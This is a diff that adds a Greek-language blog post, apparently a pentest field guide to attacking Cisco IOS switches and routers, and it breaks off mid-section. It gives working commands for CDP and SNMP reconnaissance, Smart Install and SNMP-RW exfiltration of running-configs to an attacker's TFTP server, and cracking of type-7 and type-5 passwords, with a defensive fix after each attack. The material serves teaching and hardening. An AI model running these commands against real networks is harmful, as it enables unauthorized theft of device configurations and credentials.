@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>Επιθεσεις σε Cisco Εξοπλισμο — Οδηγος Πεδιου για Pentester — S. Markakis</title>
+<meta name="description" content="Το επιθετικό συμπλήρωμα της σειράς IOS: τι κάνει στην πραγματικότητα ένας επιτιθέμενος σε ένα Cisco switch ή router — CDP/SNMP recon, κλοπή config μέσω Smart Install, exfil config μέσω SNMP-RW, cracking κωδικών type-7/5/8/9, και κατάχρηση Layer-2 μέσω DTP/VTP — με τη διόρθωση μίας γραμμής για κάθε περίπτωση.">
+<meta property="og:title" content="Επιθεσεις σε Cisco Εξοπλισμο — Οδηγος Πεδιου για Pentester — S. Markakis">
+<meta property="og:description" content="Το επιθετικό συμπλήρωμα της σειράς IOS: τι κάνει στην πραγματικότητα ένας επιτιθέμενος σε ένα Cisco switch ή router — CDP/SNMP recon, κλοπή config μέσω Smart Install, exfil config μέσω SNMP-RW, cracking κωδικών type-7/5/8/9, και κατάχρηση Layer-2 μέσω DTP/VTP — με τη διόρθωση μίας γραμμής για κάθε περίπτωση.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/cisco-attacking-ios-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/cisco-attacking-ios.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/cisco-attacking-ios.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/cisco-attacking-ios-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/cisco-attacking-ios.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/cisco-attacking-ios-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/cisco-attacking-ios.html">
+
+
+
+
+
+<link rel="stylesheet" href="../fonts/inter.css">
+<link rel="stylesheet" href="../fonts/display.css">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root{--bg:#f0efe9;--card:#fff;--code-bg:#e8e6e0;--term-bg:#e8e6e0;--rule:#e0deda;--body:#5e5a52;--mid:#0f0f0f;--head:#0f0f0f;--accent:#c63d1f;--gotcha:#c08020;--defender:#3a5a78;--font-disp:'Barlow Condensed',sans-serif;--font-body:'Inter',-apple-system,sans-serif;--font-mono:'JetBrains Mono',monospace;}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  html{font-size:16px;background:var(--bg);color:var(--body);}
+  body{font-family:var(--font-body);font-weight:400;line-height:1.7;background:var(--bg);min-height:100vh;}
+  a{color:var(--accent);text-decoration:none;}a:hover{text-decoration:underline;}
+  .wrap{position:relative;z-index:1;width:100%;max-width:760px;margin:0 auto;padding:3rem 1.5rem 5rem;}
+  .post-meta{font-size:.78rem;letter-spacing:.06em;text-transform:uppercase;color:var(--body);margin-bottom:.8rem;}
+  .post-meta span{color:var(--accent);font-weight:600;}
+  h1.post-title{font-family:var(--font-disp);font-weight:900;font-size:3rem;line-height:1.05;color:var(--head);text-transform:uppercase;letter-spacing:.02em;margin-bottom:1rem;}
+  .post-subtitle{font-size:1.05rem;color:var(--mid);font-weight:400;margin-bottom:1.4rem;line-height:1.5;}
+  .tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:2rem;}
+  .tag{font-family:var(--font-body);font-weight:600;font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--head);border-radius:999px;padding:.18em .75em;color:var(--mid);}
+  hr.title-rule{border:none;border-top:1px solid var(--rule);margin-bottom:2rem;}
+  .thesis-card{background:var(--card);border-radius:6px;border-left:3px solid var(--accent);padding:1.6rem 1.8rem;margin-bottom:2.6rem;}
+  .thesis-card p{color:var(--mid);font-size:.98rem;line-height:1.7;}
+  .thesis-card p+p{margin-top:.8rem;}
+  .prereqs-label{font-family:var(--font-disp);font-weight:700;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);margin-top:1.2rem;margin-bottom:.5rem;}
+  .prereqs-list{list-style:none;padding:0;}
+  .prereqs-list li{font-size:.88rem;color:var(--mid);padding:.15rem 0 .15rem 1rem;position:relative;}
+  .prereqs-list li::before{content:"›";position:absolute;left:0;color:var(--accent);font-weight:700;}
+  .section-num{font-family:var(--font-disp);font-weight:700;font-size:.82rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.2rem;margin-top:2.8rem;}
+  h2.section-title{font-family:var(--font-disp);font-weight:800;font-size:1.9rem;color:var(--head);text-transform:uppercase;letter-spacing:.03em;line-height:1.1;margin-bottom:.5rem;}
+  .section-thesis{font-style:italic;color:var(--mid);font-size:.95rem;margin-bottom:1.4rem;line-height:1.6;border-bottom:1px solid var(--rule);padding-bottom:.8rem;}
+  h3.sub{font-family:var(--font-disp);font-weight:700;font-size:1.15rem;color:var(--mid);text-transform:uppercase;letter-spacing:.06em;margin:1.6rem 0 .5rem;}
+  p{margin-bottom:1rem;color:var(--body);font-size:.96rem;}
+  strong{color:var(--mid);font-weight:600;}
+  .term-wrap{background:var(--term-bg);border-radius:5px;border:1px solid var(--rule);margin:1.2rem 0;overflow-x:auto;}
+  .term-label{font-family:var(--font-disp);font-weight:700;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--body);background:var(--rule);padding:.3rem .9rem;display:block;border-bottom:1px solid var(--rule);}
+  pre.term{font-family:var(--font-mono);font-size:.82rem;line-height:1.75;padding:1rem 1.2rem;white-space:pre;color:var(--mid);background:none;border:none;margin:0;}
+  span.pc{color:var(--accent);font-weight:500;}
+  span.out{color:var(--mid);}
+  span.cmt{color:var(--body);font-style:italic;}
+  span.key{color:var(--accent);font-weight:600;font-style:normal;}
+  code{font-family:var(--font-mono);font-size:.82em;background:var(--code-bg);border:1px solid var(--rule);border-radius:3px;padding:.1em .4em;color:var(--mid);}
+  .callout{border-radius:5px;padding:1rem 1.2rem;margin:1.4rem 0;font-size:.9rem;}
+  .callout-label{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.4rem;}
+  .callout p{margin:0;font-size:.9rem;}
+  .callout p+p{margin-top:.5rem;}
+  .gotcha{background:var(--card);border-left:3px solid var(--gotcha);}
+  .gotcha .callout-label{color:var(--gotcha);}
+  .didnt-work{background:var(--code-bg);border-left:3px solid var(--rule);}
+  .didnt-work .callout-label{color:var(--body);}
+  .defender{background:var(--card);border-left:3px solid var(--defender);}
+  .defender .callout-label{color:var(--defender);}
+  .diagram-wrap{margin:1.6rem 0;border-radius:6px;border:1px solid var(--rule);overflow:hidden;background:var(--card);}
+  .diagram-wrap svg{display:block;width:100%;height:auto;}
+  kbd{display:inline-block;font-family:var(--font-mono);font-size:.75em;background:var(--head);color:#eae8e3;border-radius:4px;padding:.1em .5em;margin:0 .1em;font-weight:500;letter-spacing:.02em;}
+  .cheat{width:100%;border-collapse:collapse;margin:1.2rem 0;font-size:.85rem;}
+  .cheat th{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;background:var(--rule);color:var(--mid);padding:.4rem .8rem;text-align:left;}
+  .cheat td{padding:.4rem .8rem;border-bottom:1px solid var(--rule);vertical-align:top;}
+  .cheat tr:nth-child(even) td{background:var(--card);}
+  .cheat td:first-child{font-family:var(--font-mono);font-size:.8rem;color:var(--accent);white-space:nowrap;}
+  .cheat td:last-child{color:var(--body);font-size:.82rem;}
+  .safe-badge{display:inline-block;font-family:var(--font-disp);font-weight:700;font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;background:#3a5a78;color:#fff;border-radius:3px;padding:.1em .5em;margin-left:.4rem;vertical-align:middle;}
+  .danger-badge{display:inline-block;font-family:var(--font-disp);font-weight:700;font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;background:var(--accent);color:#fff;border-radius:3px;padding:.1em .5em;margin-left:.4rem;vertical-align:middle;}
+  .takeaways{background:var(--card);border-radius:6px;padding:1.6rem 1.8rem;margin:2.4rem 0;}
+  .takeaways-title{font-family:var(--font-disp);font-weight:800;font-size:1.1rem;letter-spacing:.08em;text-transform:uppercase;color:var(--head);margin-bottom:1rem;}
+  .takeaways ol{padding-left:1.4rem;}
+  .takeaways li{font-size:.92rem;color:var(--mid);margin-bottom:.55rem;line-height:1.55;}
+  .cta-card{background:var(--card);border-radius:6px;border-top:3px solid var(--accent);padding:1.8rem 2rem;margin-top:2.8rem;text-align:center;}
+  .cta-card h3{font-family:var(--font-disp);font-weight:800;font-size:1.5rem;text-transform:uppercase;letter-spacing:.04em;color:var(--head);margin-bottom:.6rem;}
+  .cta-card p{font-size:.93rem;color:var(--mid);max-width:520px;margin:0 auto 1.2rem;}
+  .cta-btn{display:inline-block;background:var(--accent);color:#fff;font-family:var(--font-disp);font-weight:700;font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;padding:.65em 1.8em;border-radius:4px;transition:opacity .15s;}
+  .cta-btn:hover{opacity:.88;text-decoration:none;}
+  footer{border-top:1px solid var(--rule);margin-top:4rem;padding:1.2rem 1.5rem;display:flex;justify-content:space-between;align-items:center;font-size:.78rem;color:var(--body);letter-spacing:.04em;}
+  footer a{color:var(--body);}footer a:hover{color:var(--accent);}
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --card:#1a1a1a; --code-bg:#161616; --term-bg:#161616; --rule:#2a2a2a;
+    --body:#959086; --mid:#f4f3ef; --head:#f4f3ef; --accent:#c63d1f;
+    --gotcha:#d9a441; --defender:#6f9fc9;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Επιθεσεις σε Cisco Εξοπλισμο — Οδηγος Πεδιου για Pentester",
+  "description": "Το επιθετικό συμπλήρωμα της σειράς IOS: τι κάνει στην πραγματικότητα ένας επιτιθέμενος σε ένα Cisco switch ή router — CDP/SNMP recon, κλοπή config μέσω Smart Install, exfil config μέσω SNMP-RW, cracking κωδικών type-7/5/8/9, και κατάχρηση Layer-2 μέσω DTP/VTP — με τη διόρθωση μίας γραμμής για κάθε περίπτωση.",
+  "datePublished": "2026-07-30",
+  "dateModified": "2026-07-30",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/cisco-attacking-ios-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/cisco-attacking-ios.png",
+  "keywords": [
+    "cisco",
+    "offensive",
+    "security"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#cisco-attacking-ios"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Inter',-apple-system,sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrap">
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--body);margin-bottom:1.4rem;"><a href="cisco-attacking-ios.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--mid);">Ελληνικά</strong></p>
+
+  <p class="post-meta"><span>Cisco / Επιθετικο</span> &nbsp;·&nbsp; Ασφαλεια &nbsp;·&nbsp; Ιουλιος 2026</p>
+  <h1 class="post-title">Επιθεσεις σε Cisco Εξοπλισμο<br>Οδηγος Πεδιου για Pentester</h1>
+  <p class="post-subtitle">Όλη η σειρά μέχρι τώρα χτίζει και θωρακίζει IOS. Αυτό το post είναι η άλλη πλευρά του τραπεζιού: τι τρέχω στην πράξη πάνω σε ένα Cisco switch ή router σε ένα engagement, και γιατί δουλεύει κάθε επίθεση. Κάθε τεχνική εδώ αντιστοιχεί σε μια διόρθωση μίας γραμμής από παλιότερα posts — αυτό είναι το νόημα. Θωρακίζεις αυτό που καταλαβαίνεις ότι δέχεται επίθεση.</p>
+  <div class="tags">
+    <span class="tag">Cisco IOS</span>
+    <span class="tag">Επιθετικο</span>
+    <span class="tag">Pentest</span>
+    <span class="tag">Smart Install</span>
+    <span class="tag">SNMP</span>
+    <span class="tag">Layer 2</span>
+  </div>
+  <hr class="title-rule">
+
+  <!-- Hero diagram -->
+  <div class="diagram-wrap" style="margin-bottom:2rem;">
+    <svg viewBox="0 0 720 210" xmlns="http://www.w3.org/2000/svg">
+      <rect width="720" height="210" fill="#e1ded7"/>
+      <!-- attacker -->
+      <rect x="24" y="82" width="120" height="46" rx="6" fill="#e8c8c0" stroke="#c63d1f"/>
+      <text x="84" y="102" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#c63d1f;text-anchor:middle;">Επιτιθεμενος</text>
+      <text x="84" y="118" style="font-family:ui-monospace,monospace;font-size:8px;fill:#c63d1f;text-anchor:middle;">on-LAN / access port</text>
+      <!-- switch -->
+      <rect x="300" y="76" width="120" height="58" rx="6" fill="#cfe0ee" stroke="#3a5a78"/>
+      <text x="360" y="98" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#3a5a78;text-anchor:middle;">Catalyst / ISR</text>
+      <text x="360" y="114" style="font-family:ui-monospace,monospace;font-size:8px;fill:#3a5a78;text-anchor:middle;">στοχος IOS</text>
+      <path d="M144 105 L300 105" stroke="#8a8880" stroke-width="2"/>
+      <!-- attack labels -->
+      <text x="222" y="60"  style="font-family:ui-monospace,monospace;font-size:8.5px;fill:#c63d1f;text-anchor:middle;">CDP leak · SNMP · SMI 4786</text>
+      <text x="222" y="160" style="font-family:ui-monospace,monospace;font-size:8.5px;fill:#c63d1f;text-anchor:middle;">DTP trunk-negotiation · VTP</text>
+      <!-- loot -->
+      <rect x="576" y="82" width="120" height="46" rx="6" fill="#d8e8d0" stroke="#558840"/>
+      <text x="636" y="102" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#3a6a28;text-anchor:middle;">running-config</text>
+      <text x="636" y="118" style="font-family:ui-monospace,monospace;font-size:8px;fill:#3a6a28;text-anchor:middle;">creds · SNMP · κλειδια</text>
+      <path d="M420 105 L576 105" stroke="#8a8880" stroke-width="2" stroke-dasharray="4,3"/>
+      <text x="498" y="98" style="font-family:ui-monospace,monospace;font-size:8px;fill:#888880;text-anchor:middle;">exfil</text>
+      <text x="360" y="196" style="font-family:'Inter',sans-serif;font-size:9px;fill:#888880;text-anchor:middle;">Οι περισσότεροι συμβιβασμοί Cisco είναι configuration, όχι κώδικας — παλιά defaults που έμειναν ανοιχτά, όχι zero-days.</text>
+    </svg>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Scope &amp; Εξουσιοδοτημενη Χρηση</span>
+    <p>Όλα τα παρακάτω είναι για <strong>εξουσιοδοτημένο security testing</strong> — δικό σου lab, ένα CTF, ή ένα engagement με γραπτό scope — και για να δείξουν στους defenders ακριβώς τι θωρακίζουν. Το να τα τρέξεις πάνω σε εξοπλισμό που δεν σου ανήκει ή δεν έχεις contract να τεστάρεις είναι παράνομο. Οι εντολές υποθέτουν lab (GNS3/CML/EVE-NG ή kit στον πάγκο σου)· το κέρδος είναι η <em>διόρθωση</em> σε κάθε ενότητα, cross-linked με τα αμυντικά posts της σειράς.</p>
+  </div>
+
+  <!-- Thesis -->
+  <div class="thesis-card">
+    <p>Να η άβολη αλήθεια από χρόνια network pentests: σχεδόν ποτέ δεν <em>κάνεις exploit</em> σε ένα Cisco box με την έννοια CVE. Το <strong>μαζεύεις</strong>. Η συσκευή σου δίνει το ίδιο της το config μέσα από ένα management protocol που κανείς δεν έκλεισε, ή ένα access port διαπραγματεύεται μόνο του σε trunk, ή ένα «προσωρινό» SNMP community από το 2014 είναι ακόμα <code>private</code>. Η επιφάνεια επίθεσης είναι το άθροισμα κάθε default που ο τελευταίος engineer δεν απενεργοποίησε.</p>
+    <p>Αυτός ο οδηγός περπατά το πραγματικό kill-chain με τη σειρά: <strong>recon</strong> (CDP/LLDP και SNMP σου δίνουν μοντέλο, έκδοση IOS, και management IP δωρεάν), <strong>κλοπή config</strong> (Smart Install και SNMP-RW δίνουν και τα δύο <code>running-config</code> χωρίς authentication), <strong>cracking credentials</strong> (οι τύποι κωδικών σε αυτό το config, από το τετριμμένα αναστρέψιμο type&nbsp;7 μέχρι το crackable type&nbsp;5), και <strong>κατάχρηση Layer-2</strong> (DTP και VTP, οι επιθέσεις switch που σε βάζουν σε VLAN που δεν θα έπρεπε να φτάνεις). Κάθε ενότητα κλείνει με τη μία εντολή που την κλείνει.</p>
+    <div class="prereqs-label">Ταιριαζει με</div>
+    <ul class="prereqs-list">
+      <li>Τα αμυντικά originals: <a href="cisco-hardening.html">Θωρακιση Management-Plane</a>, <a href="cisco-switch-security.html">Ασφαλεια Switch</a></li>
+      <li><a href="cisco-observability.html">Observability</a> (SNMP σωστά) και <a href="cisco-vlans-trunking.html">VLAN &amp; Trunking</a> (αυτό που καταχράται το DTP)</li>
+      <li>Ο σύντροφος blue-team: <a href="detecting-cisco-attacks.html">Ανιχνευση Επιθεσεων σε Cisco Εξοπλισμο</a> — πιάσε καθεμία από αυτές στα logs</li>
+      <li>Ένα lab που σου ανήκει — ποτέ μη στοχεύεις παραγωγικά συστήματα εκτός scope</li>
+    </ul>
+  </div>
+
+  <!-- 01 -->
+  <p class="section-num">01</p>
+  <h2 class="section-title">Recon — Η Συσκευη Συστηνεται Μονη Της <span class="safe-badge">Παθητικο</span></h2>
+  <p class="section-thesis"><em>Πριν αγγίξεις οτιδήποτε, άκου. Το Cisco Discovery Protocol κάνει broadcast την ταυτότητα της συσκευής σε κάθε access port κάθε 60 δευτερόλεπτα — μοντέλο, έκδοση IOS, native VLAN, και management IP, χωρίς auth. Είναι το πιο φιλικό recon στο networking.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Επιτιθεμενος (on-LAN) — sniff CDP/LLDP, μετα fingerprint μεσω SNMP</span>
+    <pre class="term"><span class="cmt"># Τα CDP frames γίνονται multicast στο 01:00:0c:cc:cc:cc κάθε ~60s.
+# Κάτσε σε access port και περίμενε ένα interval.</span>
+<span class="pc">$</span> <span class="out">tcpdump -nn -v -i eth0 'ether host 01:00:0c:cc:cc:cc' -c 1</span>
+<span class="out">  Device-ID 'CoreSW1.corp.local'  Version 'Cisco IOS ... Version 15.2(4)E7'
+  Platform 'cisco WS-C2960X-48'  Address 10.10.0.2  Native VLAN 99  VTP 'CORP'</span>
+
+<span class="cmt"># Αυτό το ένα frame μας έδωσε μοντέλο, IOS train, mgmt IP, native VLAN, VTP domain.
+# Τώρα επιβεβαίωσε SNMP και μάντεψε communities (public/private/cisco είναι αιώνια).</span>
+<span class="pc">$</span> <span class="out">onesixtyone -c /usr/share/wordlists/snmp.txt 10.10.0.2</span>
+<span class="out">10.10.0.2 [private] Cisco IOS Software, C2960X ... Version 15.2(4)E7</span>
+
+<span class="pc">$</span> <span class="out">snmpwalk -v2c -c private 10.10.0.2 | head</span>   <span class="cmt"># RW community — jackpot</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Η Διορθωση — Κλεισε Οτι Δεν Χρειαζεσαι</span>
+    <p>Το CDP ανήκει ανάμεσα στις δικές σου συσκευές, ποτέ προς χρήστες ή το edge: <code>no cdp run</code> global, ή <code>no cdp enable</code> ανά μη έμπιστο interface (προτίμησε LLDP μόνο όπου ένα τηλέφωνο πραγματικά το χρειάζεται). SNMP: σκότωσε τελείως v1/v2c και πέρνα σε <strong>SNMPv3 με auth+priv</strong> — δες <a href="cisco-observability.html">Observability</a>. Αν πρέπει να υπάρχει community string, ποτέ δεν είναι λέξη λεξικού, και τα RW communities δεν έχουν κανέναν λόγο να υπάρχουν στα περισσότερα δίκτυα.</p>
+  </div>
+
+  <!-- 02 -->
+  <p class="section-num">02</p>
+  <h2 class="section-title">Smart Install — Το Μηχανημα Πωλησης Config <span class="danger-badge">Χωρις Authentication</span></h2>
+  <p class="section-thesis"><em>Το Smart Install (SMI) είναι ένα feature zero-touch provisioning που ακούει στο TCP&nbsp;4786 και, σε unpatched/unconfigured switches, θα δεχτεί ένα craft-αρισμένο μήνυμα που κάνει το switch να στείλει το ίδιο του το running-config μέσω TFTP σε μια διεύθυνση της επιλογής σου — χωρίς credentials. Ερχόταν ενεργό σε μια γενιά Catalyst και είναι ακόμα παντού.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Επιτιθεμενος — εντοπισε SMI, μετα τραβηξε το config (SIET / Nmap)</span>
+    <pre class="term"><span class="cmt"># 1. Ακούει το Smart Install; (TCP 4786)</span>
+<span class="pc">$</span> <span class="out">nmap -p4786 -sV --script cisco-smart-install 10.10.0.0/24</span>
+<span class="out">10.10.0.2  4786/tcp open  smart-install
+  | cisco-smart-install: Device is a Smart Install Client and vulnerable</span>
+
+<span class="cmt"># 2. Ξεκίνα TFTP server για να πιάσεις το loot.</span>
+<span class="pc">$</span> <span class="out">sudo atftpd --daemon --port 69 /tmp/loot</span>
+
+<span class="cmt"># 3. SIET: πες στο switch να αντιγράψει το running-config σε μας μέσω TFTP.</span>
+<span class="pc">$</span> <span class="out">python3 siet.py -g -r 10.10.0.2 -l 10.10.0.66</span>
+<span class="out">[*] Sending config-copy request to 10.10.0.2 ...
+[+] Received CoreSW1-confg (14 KB) -> /tmp/loot/CoreSW1-confg</span>
+
+<span class="cmt"># Το πλήρες running-config, με κάθε password hash και κλειδί, χωρίς authentication.</span>
+<span class="pc">$</span> <span class="out">grep -E 'secret|password|snmp|key ' /tmp/loot/CoreSW1-confg</span></pre>
+  </div>
+
+  <div class="callout gotcha">
+    <span class="callout-label">⚠ Παγιδα — «Ποτε Δεν Κανουμε Configure το Smart Install»</span>
+    <p>Αυτό είναι ακριβώς το πρόβλημα. Το SMI είναι <strong>on by default</strong> όταν δεν υπάρχει <code>vstack</code> configuration — η απουσία config είναι η ευάλωτη κατάσταση, όχι η παρουσία της. Το <code>show vstack config</code> που αναφέρει τον ρόλο ως <em>Client (SmartInstall enabled)</em> σε ένα switch που ποτέ δεν προοριζόταν να γίνει provision έτσι είναι το τεκμήριο. Αυτό το ένα feature έχει οδηγήσει σε μαζικές internet-wide καμπάνιες κλοπής config· αντιμετώπισε οποιοδήποτε εκτεθειμένο 4786 σε χρήστες ως πλήρη συμβιβασμό.</p>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Η Διορθωση — Μια Εντολη</span>
+    <p>Το <code>no vstack</code> στο global config απενεργοποιεί εντελώς το Smart Install. Αν πραγματικά δεν μπορείς (σπάνιο), περιόρισε το 4786 με <a href="cisco-acls.html">ACL</a> μόνο στον provisioning server. Επαλήθευσε με <code>show vstack config</code> → <em>Role: Client (SmartInstall disabled)</em>. Αυτό είναι το one-liner με τη μεγαλύτερη αξία σε όλη τη σειρά θωράκισης.</p>
+  </div>
+
+  <!-- 03 -->
+  <p class="section-num">03</p>
+  <h2 class="section-title">SNMP-RW — Αντιγραφη Config Με Ενα Set <span class="danger-badge">Αναγνωση-Εγγραφη</span></h2>
+  <p class="section-thesis"><em>Ένα read-write SNMP community δεν είναι «διάβασε μερικά OID» — είναι ένα API μέσα στη συσκευή. Με το CISCO-CONFIG-COPY-MIB λες στο switch να στείλει το running-config του σε σένα μέσω TFTP, χρησιμοποιώντας μόνο <code>snmpset</code>. Ίδιο loot με το Smart Install, διαφορετική ξεκλείδωτη πόρτα.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Επιτιθεμενος — οδηγησε το ccCopyTable για exfil running-config μεσω TFTP</span>
+    <pre class="term"><span class="cmt"># RW community 'private' από το recon. Row index 111 είναι αυθαίρετο.
+# ccCopyProtocol=1(tftp) SourceFileType=4(running) DestFileType=1(networkFile)</span>
+<span class="pc">$</span> <span class="out">snmpset -v2c -c private 10.10.0.2 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a "10.10.0.66" \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s "CoreSW1.cfg" \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1</span>       <span class="cmt"># RowStatus=createAndGo</span>
+<span class="out">  ... ccCopyState.111 = running   ->   success</span>
+
+<span class="cmt"># Το config καταλήγει στον TFTP server σου. Το Metasploit το έχει έτοιμο:</span>
+<span class="pc">$</span> <span class="out">msfconsole -qx "use auxiliary/scanner/snmp/cisco_config_tftp; \
+    set RHOSTS 10.10.0.2; set COMMUNITY private; run; exit"</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Η Διορθωση — Οχι v2c, Οχι RW, Τελος</span>
+    <p>Όλη η επίθεση πεθαίνει χωρίς ένα RW community που μπορεί να μαντευτεί. Μετανάστευσε σε <strong>SNMPv3</strong> (authPriv), αφαίρεσε κάθε γραμμή <code>snmp-server community</code>, και αν το legacy v2c είναι αναπόφευκτο, δέσε το read-only σε ένα management ACL και χρησιμοποίησε τυχαίο string 20+ χαρακτήρων — ποτέ <code>public</code>/<code>private</code>/το hostname. Δες <a href="cisco-observability.html">Observability</a> για το build v3. Bonus: κατέγραψε τα events config-copy του <code>snmp-server</code> σε <a href="cisco-observability.html">syslog</a> ώστε μια απόπειρα exfil να είναι ορατή.</p>
+  </div>
+
+  <!-- 04 -->
+  <p class="section-num">04</p>
+  <h2 class="section-title">Cracking Οτι Υπαρχει στο Config</h2>
+  <p class="section-thesis"><em>Έχεις το running-config. Τώρα τα password hashes μέσα του γίνονται creds — και οι «τύποι» κωδικών της Cisco κυμαίνονται από στιγμιαία αναστρέψιμοι μέχρι πραγματικά ισχυροί. Το να ξέρεις ποιος είναι ποιος σου λέει τι αξίζει cracking και τι πέφτει σε δευτερόλεπτα.</em></p>
+
+  <table class="cheat">
+    <thead><tr><th>Type στο config</th><th>Αλγοριθμος</th><th>Προσπαθεια Επιτιθεμενου</th></tr></thead>
+    <tbody>
+      <tr><td>password 7 09424B1C…</td><td>Vigenère (obfuscation)</td><td><strong>Στιγμιαιο</strong> — αναστρέψιμο, όχι hash</td></tr>
+      <tr><td>secret 5 $1$…</td><td>MD5-crypt</td><td>Γρηγορο — hashcat <code>-m 500</code></td></tr>
+      <tr><td>secret 4 $4$…</td><td>plain SHA-256 (σπασμένη υλοποίηση)</td><td>Γρηγορο — deprecated από Cisco</td></tr>
+      <tr><td>secret 8 $8$…</td><td>PBKDF2-SHA256</td><td>Αργο — hashcat <code>-m 9200</code></td></tr>
+      <tr><td>secret 9 $9$…</td><td>scrypt</td><td>Πιο αργό — hashcat <code>-m 9300</code></td></tr>
+    </tbody>
+  </table>
+
+  <div class="term-wrap">
+    <span class="term-label">Επιτιθεμενος — reverse το type 7 στιγμιαια, crack το type 5 offline</span>
+    <pre class="term"><span class="cmt"># Το Type 7 ΔΕΝ είναι encryption — είναι αναστρέψιμο obfuscation. Decode στιγμιαία:</span>
+<span class="pc">$</span> <span class="out">echo '09424B1C0007' | ciscot7 -d -</span>
+<span class="out">  cisco</span>
+<span class="cmt"># (οποιοσδήποτε decoder type-7 το κάνει· δεν υπάρχει τίποτα να «σπάσεις»)</span>
+
+<span class="cmt"># Type 5 (MD5-crypt) — τράβα το από το config και πέτα του ένα wordlist.</span>
+<span class="pc">$</span> <span class="out">grep 'secret 5' CoreSW1-confg</span>
+<span class="out">  enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0</span>
+<span class="pc">$</span> <span class="out">hashcat -m 500 -a 0 '$1$mERr$hx5rVt7rPNoS4wqbXKX7m0' rockyou.txt</span>
+<span class="out">  $1$mERr$hx5rVt7rPNoS4wqbXKX7m0:cisco123</span></pre>
+  </div>
+
+  <div class="callout gotcha">
+    <span class="callout-label">⚠ Παγιδα — Το <code>service password-encryption</code> Ειναι Θεατρο</span>
